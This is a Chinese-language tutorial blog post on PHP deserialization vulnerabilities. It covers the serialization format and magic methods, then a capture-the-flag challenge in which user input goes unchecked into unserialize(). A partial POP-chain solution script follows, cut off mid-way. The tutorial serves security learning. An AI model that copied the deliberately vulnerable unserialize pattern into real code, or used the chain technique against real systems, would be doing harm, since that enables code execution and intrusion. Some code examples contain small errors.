    <url>/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><ul>
<li>PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用<code>serialize()</code>函数。</li>
</ul>
<ul>
<li><p>PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用<code>unserialize()</code>函数。</p>
</li>
<li><p>PHP反序列化漏洞：如果代码中使用了反序列化 <code>unserialize()</code>函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列魔术方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。</p>
</li>
</ul>
<p><br></p>
<h3 id="0x02-序列化格式"><a href="#0x02-序列化格式" class="headerlink" title="0x02 序列化格式"></a>0x02 序列化格式</h3><p>例子如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $x;</span><br><span class="line">        <span class="keyword">private</span> $y;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x, $y)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;x = $x;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;y = $y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $number = <span class="number">10</span>;</span><br><span class="line">    $str = <span class="string">'Lethe'</span>;</span><br><span class="line">    $bool = <span class="keyword">true</span>;</span><br><span class="line">    $null = <span class="keyword">NULL</span>;</span><br><span class="line">    $arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">1</span>, <span class="string">'b'</span> =&gt; <span class="number">2</span>);</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">'lethe'</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    var_dump(serialize($number));	<span class="comment">//string(5) "i:10;"</span></span><br><span class="line">    var_dump(serialize($str));		<span class="comment">//string(12) "s:5:"Lethe";"</span></span><br><span class="line">    var_dump(serialize($bool));		<span class="comment">//string(4) "b:1;"</span></span><br><span class="line">    var_dump(serialize($null));		<span class="comment">//string(2) "N;"</span></span><br><span class="line">    var_dump(serialize($arr));		<span class="comment">//string(30) "a:2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;"</span></span><br><span class="line">    var_dump(serialize($a));		<span class="comment">//string(73) "O:1:"A":4:&#123;s:4:"data";N;s:7:" A pass";N;s:1:"x";s:5:"lethe";s:1:"y";b:1;&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>输出结果如下：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">string</span>(5) "<span class="selector-tag">i</span><span class="selector-pseudo">:10</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(12) "<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"Lethe"</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(4) "<span class="selector-tag">b</span><span class="selector-pseudo">:1</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(2) "<span class="selector-tag">N</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(30) "<span class="selector-tag">a</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"b"</span>;<span class="attribute">i</span>:<span class="number">2</span>;&#125;"</span><br><span class="line"><span class="selector-tag">string</span>(47) "<span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"x"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"lethe"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">" A y"</span>;<span class="attribute">b</span>:<span class="number">1</span>;&#125;"</span><br></pre></td></tr></table></figure></p>
<p>可以看到不同的php数据结构序列化后结构如下：<br>所以序列化对于不同类型得到的字符串格式为：</p>
<ul>
<li>String : <code>s:字符串长度:&quot;字符串值&quot;;</code></li>
<li>Integer : <code>i:数值;</code></li>
<li>Boolean : <code>b:value;(value为1或0)</code></li>
<li>Null : <code>N;</code></li>
<li>Array : <code>a:数组大小:{键的描述;值的描述;键的描述;值的描述; ...}  （描述值同String或Int型的序列化格式）</code></li>
<li>Object : <code>O:类名长度:&quot;类名&quot;:属性数量:{属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值; ...}</code></li>
</ul>
<p>除此之外，还要注意类内不同限定的属性及方法序列化后格式也不同，如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $a=<span class="string">"private"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $b=<span class="string">"protected"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $c=<span class="string">"public"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $aa = <span class="keyword">new</span> A();</span><br><span class="line">    $bb = <span class="keyword">new</span> B();</span><br><span class="line">    $cc = <span class="keyword">new</span> C();</span><br><span class="line">    <span class="keyword">echo</span> serialize($aa);</span><br><span class="line">    <span class="keyword">echo</span> serialize($bb);</span><br><span class="line">    <span class="keyword">echo</span> serialize($cc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>输出如下：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">" A a"</span>;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"private"</span>;&#125;</span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"B"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">" * b"</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"protected"</span>;&#125;</span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"C"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"c"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"public"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="0x03-魔术方法"><a href="#0x03-魔术方法" class="headerlink" title="0x03 魔术方法"></a>0x03 魔术方法</h3><h6 id="（1）PHP16个魔术方法"><a href="#（1）PHP16个魔术方法" class="headerlink" title="（1）PHP16个魔术方法"></a>（1）PHP16个魔术方法</h6><p>PHP中把以双下划线__开头的方法称为魔术方法(Magic methods)，这些方法在达到某些条件时将会自动被调用：</p>
<ul>
<li><p>__construct()，类的构造函数，:当一个类被创建时自动调用</p>
</li>
<li><p>__destruct()，类的析构函数，当一个类被销毁时自动调用</p>
</li>
<li><p>__sleep()，执行serialize()进行序列化时，先会调用这个函数</p>
</li>
<li><p>__wakeup()，执行unserialize()进行反序列化时，先会调用这个函数</p>
</li>
<li><p>__toString()，当把一个类当作函数使用时自动调用</p>
</li>
<li><p>__invoke()，当把一个类当作函数使用时自动调用</p>
</li>
<li><p>__call()，在对象中调用一个不可访问方法时调用</p>
</li>
<li><p>__callStatic()，用静态方式中调用一个不可访问方法时调用</p>
</li>
<li><p>__get()，获得一个类的成员变量时调用</p>
</li>
<li><p>__set()，设置一个类的成员变量时调用</p>
</li>
<li><p>__isset()，当对不可访问属性调用isset()或empty()时调用</p>
</li>
<li><p>__unset()，当对不可访问属性调用unset()时被调用。</p>
</li>
<li><p>__set_state()，调用var_export()导出类时，此静态方法会被调用。</p>
</li>
<li><p>__clone()，当对象复制完成时调用</p>
</li>
<li><p>__autoload()，尝试加载未定义的类</p>
</li>
<li><p>__debugInfo()，打印所需调试信息</p>
</li>
</ul>
<p>具体调用情况可以参考：<a href="https://segmentfault.com/a/1190000007250604#articleHeader4" target="_blank" rel="noopener">https://segmentfault.com/a/1190000007250604#articleHeader4</a></p>
<p>其实在反序列化漏洞中经常利用的有：<code>__construct()</code>，<code>__destruct()</code>，<code>__sleep()</code>，<code>__wakeup()</code>，<code>__toString()</code>，<code>__invoke()</code>，<code>__call()</code>这几个，所以下面针对这几个作具体说明。</p>
<h6 id="（2）-construct-调用方式"><a href="#（2）-construct-调用方式" class="headerlink" title="（2）__construct()调用方式"></a>（2）__construct()调用方式</h6><p>在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a construct function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">This is <span class="keyword">a</span> construct <span class="function"><span class="keyword">function</span></span></span><br></pre></td></tr></table></figure></p>
<h6 id="（3）-destruct-调用方式"><a href="#（3）-destruct-调用方式" class="headerlink" title="（3）__destruct()调用方式"></a>（3）__destruct()调用方式</h6><p>在每个类中都有一个析构方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的析构方法。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a construct function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a destruct function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">This <span class="keyword">is</span> a construct <span class="keyword">function</span></span><br><span class="line">This <span class="keyword">is</span> a destruct <span class="keyword">function</span></span><br></pre></td></tr></table></figure></p>
<h6 id="（4）-sleep-调用方式"><a href="#（4）-sleep-调用方式" class="headerlink" title="（4）__sleep()调用方式"></a>（4）__sleep()调用方式</h6><ul>
<li><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>；如果存在，则该方法会优先被调用，然后才执行序列化操作。</p>
</li>
<li><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
</li>
<li><p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;	</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a sleep function"</span>;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'test'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);  </span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>运行结果：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">This</span> <span class="selector-tag">is</span> <span class="selector-tag">a</span> <span class="selector-tag">sleep</span> <span class="selector-tag">function</span></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">" A test"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"Lethe"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<h6 id="（5）-wakeup-调用方式"><a href="#（5）-wakeup-调用方式" class="headerlink" title="（5）__wakeup()调用方式"></a>（5）__wakeup()调用方式</h6><p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a sleep function"</span>;</span><br><span class="line">            <span class="comment">// ....</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'test'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a wakeup function"</span>;</span><br><span class="line">            <span class="comment">// ....</span></span><br><span class="line">            <span class="comment">// 这里不需要返回数组</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);  </span><br><span class="line">    $b = serialize($a);     <span class="comment">//O:1:"A":1:&#123;s:7:" A test";s:5:"Lethe";&#125;</span></span><br><span class="line">    $c = unserialize($b);   <span class="comment">//unserialize之前先调用了__wakeup</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">This <span class="keyword">is</span> a sleep <span class="keyword">function</span></span><br><span class="line">This <span class="keyword">is</span> a wakeup <span class="keyword">function</span></span><br></pre></td></tr></table></figure></p>
<h6 id="（6）-toString-调用方式"><a href="#（6）-toString-调用方式" class="headerlink" title="（6）__toString()调用方式"></a>（6）__toString()调用方式</h6><ul>
<li><p><code>__toString()</code> 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应时该显示些什么，即调用其函数内容。</p>
</li>
<li><p><code>__toString()</code> 方法必须返回一个字符串，否则将发出一条 <code>E_RECOVERABLE_ERROR</code> 级别的致命错误。</p>
</li>
<li>不能在<code>__toString()</code> 方法中抛出异常。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $str = <span class="string">"This is a toString function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="keyword">return</span> $str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);  </span><br><span class="line">    <span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">This is <span class="keyword">a</span> toString <span class="function"><span class="keyword">function</span></span></span><br></pre></td></tr></table></figure></p>
<h6 id="（7）-invoke-调用方式"><a href="#（7）-invoke-调用方式" class="headerlink" title="（7）__invoke()调用方式"></a>（7）__invoke()调用方式</h6><ul>
<li><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用，即<code>$obj = new class(); $obj();</code>时该做什么。</p>
</li>
<li><p>本特性只在 PHP 5.3.0 及以上版本有效。</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> = <span class="string">"This is a invoke function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);</span><br><span class="line">    $a();       <span class="comment">//$a是一个对象，但却用$a()调用方法的方式来调用它</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h6 id="（8）-call-调用方式"><a href="#（8）-call-调用方式" class="headerlink" title="（8）__call()调用方式"></a>（8）__call()调用方式</h6><ul>
<li><code>__call()</code>方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</li>
<li>该方法有两个参数，第一个参数 <code>$function_name</code> 会自动接收不存在的方法名，第二个 <code>$arguments</code> 则以数组的方式接收不存在方法的多个参数。</li>
<li>格式 <code>function __call(string $function_name, array $arguments){   //...   }</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $arguments)</span></span></span><br><span class="line"><span class="function">        </span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"你所调用的函数："</span> . $funName . <span class="string">"(参数："</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">            print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行                      </span></span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);</span><br><span class="line">    $a-&gt;test(<span class="string">'no'</span>,<span class="string">'this'</span>,<span class="string">'function'</span>);  <span class="comment">//可以看到A类中并没有test()方法 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">你所调用的函数：test(参数：<span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; no</span><br><span class="line">    [<span class="number">1</span>] =&gt; this</span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">)</span></span><br><span class="line"><span class="function">)不存在！&lt;<span class="title">br</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="0x04-反序列化漏洞分析"><a href="#0x04-反序列化漏洞分析" class="headerlink" title="0x04 反序列化漏洞分析"></a>0x04 反序列化漏洞分析</h3><p>说了这么多，下面就通过几个例子看看到底如何利用php反序列化进行攻击。</p>
<h5 id="例1：全面考察的一题"><a href="#例1：全面考察的一题" class="headerlink" title="例1：全面考察的一题"></a>例1：全面考察的一题</h5><h6 id="（1）题目"><a href="#（1）题目" class="headerlink" title="（1）题目"></a>（1）题目</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"flag&#123;Here_1s_y0u_fl4g&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h6 id="（2）思路："><a href="#（2）思路：" class="headerlink" title="（2）思路："></a>（2）思路：</h6><ul>
<li><p>要想获得输出flag，那么我们肯定要想办法调用<strong>GetFlag</strong>类的里的<code>get_flag()</code>方法。</p>
</li>
<li><p>在<strong>string1</strong>类我们可以看到，只要把<code>$str1</code>实例化为<strong>GetFlag</strong>类的对象，然后调用想办法调用<code>__toString()</code>方法即可，那就找有没有地方把对象当作字符串了。</p>
</li>
<li><p>往上看，<strong>func</strong>类的<code>__invoke()</code>方法中有用<code>.</code>来进行字符串拼接的代码，那么只要把<code>$mod1</code>实例化为<strong>string</strong>类的对象，然后再调用该<code>__invoke()</code>方法即可，那就找有没有地方把对象当作函数来调用了。</p>
</li>
<li><p>发现在<strong>funct</strong>类的<code>__call()</code>中有<code>$s1();</code>可以利用，只需要把<code>$mod1</code>实例化为<strong>func</strong>类的对象，然后再调用该<code>__call()</code>方法，那就找哪里调用了未声明的函数。</p>
</li>
<li><p>再<code>Call类</code>中的<code>test1()</code>方法调用了不存在的<code>test2()</code>方法，所以只需要把<code>$mod1</code>实例化为<strong>funct</strong>类的对象，然后再调用该<code>test1()</code>方法。</p>
</li>
<li><p>看到在<strong>start_gg</strong>类中的<code>__destruct()</code>方法中正好调用了<code>test1()</code>方法，那么只要<code>$mod1</code>实例化为<strong>Call</strong>类的对象即可。</p>
</li>
<li><p>想要调用<strong>start_gg</strong>类中的<code>__destruct()</code>方法，只有实例化一个它的对象即可，这个对象在销毁时会自动调用<code>__destruct()</code>函数。<br>-</p>
</li>
<li>如何在每个类中实例化另一个类呢？可以利用类的构造函数，只要这个类被实例化，构造函数就自动实例化了你所需要的那个类。</li>
</ul>
<h6 id="（3）解答"><a href="#（3）解答" class="headerlink" title="（3）解答"></a>（3）解答</h6><p>思路清楚后就很容易了，脚本如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span 